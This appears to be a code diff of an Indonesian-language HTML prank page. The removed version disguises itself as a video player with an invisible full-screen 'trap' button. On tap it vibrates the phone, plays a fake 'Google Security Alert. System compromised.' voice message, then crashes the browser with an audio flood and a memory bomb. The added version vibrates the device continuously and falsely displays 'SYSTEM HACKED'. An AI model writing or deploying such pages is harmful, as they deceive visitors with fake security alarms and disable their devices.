@@ -1,158 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Video Player</title>
+<title>Getaran</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif;
-    display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; overflow: hidden;
+    background: #000;
+    color: #fff;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    user-select: none;
   }
-
-  /* UI PALSU */
-  .fake-player {
-    width: 100%; height: 100%;
-    display: flex; flex-direction: column; justify-content: center; align-items: center;
-    position: relative;
+  .box {
+    text-align: center;
+    padding: 40px;
+    border: 2px solid #f00;
+    border-radius: 10px;
   }
-  .play-btn {
-    width: 80px; height: 80px;
-    background: rgba(255,255,255,0.2);
-    border-radius: 50%;
-    display: flex; justify-content: center; align-items: center;
-    font-size: 30px; pointer-events: none; /* Biarkan klik menembus ke tombol trap */
-  }
-  .loading-text {
-    margin-top: 20px; font-size: 16px; color: #aaa;
-  }
-
-  /* TOMBOL TRAP (Fullscreen Transparan) */
-  #trapBtn {
-    position: absolute; top: 0; left: 0;
-    width: 100%; height: 100%;
-    opacity: 0; cursor: pointer; z-index: 10;
-  }
-
-  #status {
-    position: fixed; bottom: 20px; color: #0f0; font-family: monospace; font-size: 14px;
-  }
-
-  iframe, audio, video { display: none !important; }
+  h1 { color: #f00; }
 </style>
 </head>
 <body>
 
-<div class="fake-player">
-  <div class="play-btn">▶</div>
-  <div class="loading-text">Ketuk untuk memutar video</div>
-  <!-- Tombol Transparan Penjebak -->
-  <button id="trapBtn"></button>
+<div class="box" id="clickArea">
+  <h1>📳 KETUK LAYAR INI 📳</h1>
+  <p>Ponsel akan bergetar terus-menerus.</p>
 </div>
 
-<div id="status">Menunggu sentuhan...</div>
-
 <script>
-(function () {
+(function() {
   'use strict';
 
-  var statusEl = document.getElementById('status');
-  var isTriggered = false;
+  var isVibrating = false;
 
-  // ============================================
-  // TRAP: SAAT USER MENYENTUH LAYAR
-  // ============================================
-  document.getElementById('trapBtn').addEventListener('click', function(e) {
-    if (isTriggered) return;
-    isTriggered = true;
+  function startHistericVibration() {
+    if (isVibrating) return;
+    isVibrating = true;
 
-    // 1. Ubah UI agar user merasa aman
-    document.querySelector('.play-btn').innerText = '⏳';
-    document.querySelector('.loading-text').innerText = 'Memuat video...';
-    statusEl.innerText = "Memuat konten... (15s)";
-    statusEl.style.color = "#ff0";
-
-    // 2. MULAI GETARAN (Bypass berhasil karena ada click)
-    if ('vibrate' in navigator) {
-      console.log("[VIB] Getaran dimulai!");
-      // Getar terus menerus selama 15 detik ke depan
-      var vibrateInterval = setInterval(function() {
-        navigator.vibrate([1000, 200, 1000, 200]);
-      }, 2400);
-      
-      // Hentikan getaran setelah 15 detik (saat crash)
-      setTimeout(function() { clearInterval(vibrateInterval); }, 15000);
+    if (!('vibrate' in navigator)) {
+      alert("Browser Anda tidak mendukung Vibration API (atau Anda menggunakan PC/Mac).");
+      return;
     }
 
-    // 3. AUDIO PENGALIH PERHATIAN (Beep halus)
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') ctx.resume();
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.05;
-      osc.connect(gain); gain.connect(ctx.destination);
-      osc.start();
-      window.oscToStop = osc;
-    } catch(e) {}
+    console.log("[VIB] Memulai getaran...");
 
-    // 4. DELAY 15 DETIK (Countdown)
-    var timeLeft = 15;
-    var countdown = setInterval(function() {
-      timeLeft--;
-      statusEl.innerText = "Memuat konten... (" + timeLeft + "s)";
-      
-      if (timeLeft <= 0) {
-        clearInterval(countdown);
-        executeMaliciousPayload();
-      }
-    }, 1000);
-  });
+    // 1. Getar Pertama (Langsung)
+    // Pola: Getar 2 detik, Jeda 100ms, Getar 2 detik
+    navigator.vibrate([2000, 100, 2000, 100, 2000]);
 
-  // ============================================
-  // PAYLOAD EKSEKUSI: TTS + CRASH
-  // ============================================
-  function executeMaliciousPayload() {
-    statusEl.innerText = "🚨 SYSTEM CRITICAL 🚨";
-    statusEl.style.color = "#f00";
-
-    // Hentikan beep penenang
-    if (window.oscToStop) {
-      try { window.oscToStop.stop(); } catch(e) {}
-    }
-
-    // A. TTS Google Alert
-    if ('speechSynthesis' in window) {
-      var u = new SpeechSynthesisUtterance("Google Security Alert. System compromised.");
-      u.rate = 1.0; u.volume = 1.0;
-      window.speechSynthesis.speak(u);
-    }
-
-    // B. CRASH (OOM Memory Bomb)
-    var memoryHog = [];
+    // 2. Getar Berulang (Looping setiap 6 detik)
     setInterval(function() {
-      try {
-        // Audio Flooding
-        for (var i = 0; i < 500; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          osc.connect(ctx.destination);
-          osc.start(0);
-          
-          var u2 = new SpeechSynthesisUtterance("ERROR_" + i);
-          window.speechSynthesis.speak(u2);
-        }
+      navigator.vibrate([2000, 100, 2000, 100, 2000]);
+    }, 6000);
 
-        // Memory Bomb (100MB per 50ms)
-        var bigArray = new Uint8Array(100 * 1024 * 1024);
-        bigArray.fill(1);
-        memoryHog.push(bigArray);
-
-      } catch(e) {}
-    }, 50); 
+    // Ubah UI
+    document.body.style.background = "#300";
+    document.querySelector('h1').innerText = "🚨 SYSTEM HACKED 🚨";
+    document.querySelector('p').innerText = "Getaran tidak bisa dihentikan.";
   }
+
+  // Event Listener: Dengarkan sentuhan/klik di mana saja
+  document.body.addEventListener('click', startHistericVibration);
+  document.body.addEventListener('touchstart', startHistericVibration, { passive: true });
 
 })();
 </script>
